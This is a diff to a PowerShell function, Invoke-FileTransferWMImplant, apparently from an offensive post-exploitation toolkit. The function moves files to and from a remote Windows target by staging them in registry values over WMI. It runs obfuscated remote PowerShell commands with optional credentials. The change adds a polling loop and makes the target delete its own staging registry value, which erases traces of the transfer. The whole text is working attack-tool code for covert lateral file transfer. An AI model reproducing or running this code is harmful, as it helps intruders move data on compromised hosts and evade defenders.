@@ -4087,19 +4087,29 @@ function Invoke-FileTransferWMImplant
                 Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
             }
 
-            Write-Verbose "Sleeping to let remote system read and store file"
-            Start-Sleep -s 30
-
+            # Start the polling process to see if the file is stored in the registry
             # Grab file from remote system's registry
-            Write-Verbose "Reading file from remote registry"
-
-            if($Creds)
+            Write-Verbose "Checking if file is in the remote system's registry"
+            $quit = $false
+            while($quit -eq $false)
             {
-                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
-            }
-            else
-            {
-                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
+                if($Creds)
+                {
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+                }
+                else
+                {
+                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
+                }
+                if($remote_reg.ReturnValue -ne 0)
+                {
+                    Write-Verbose "File not doing being stored in registry, sleeping for 5..."
+                    Start-Sleep -s 5
+                }
+                else 
+                {
+                    $quit = $true
+                }
             }
             
             $decode = [byte[]][int[]]$remote_reg.sValue.Split(',') -Join ' '
@@ -4160,8 +4170,7 @@ function Invoke-FileTransferWMImplant
             
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $Target"
-            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded'
-
+            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded; Remove-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registryupname'"
             if($Creds)
             {
                 Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
@@ -4171,21 +4180,7 @@ function Invoke-FileTransferWMImplant
                 Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
             }
 
-            Write-Verbose "Sleeping to let remote system execute WMI command"
-            Start-Sleep -s 30
-
-            # Remove registry key
-            Write-Verbose "Removing registry value storing uploaded file"
-            if($Creds)
-            {
-                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target -Credential $Creds
-            }
-            else
-            {
-                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target
-            }
-
-            Write-Verbose "Done!"
+            Write-Verbose "Remote system now is copying file from WMI property and replacing it to the original value."
         }
     } # End of Process Block
     end{}
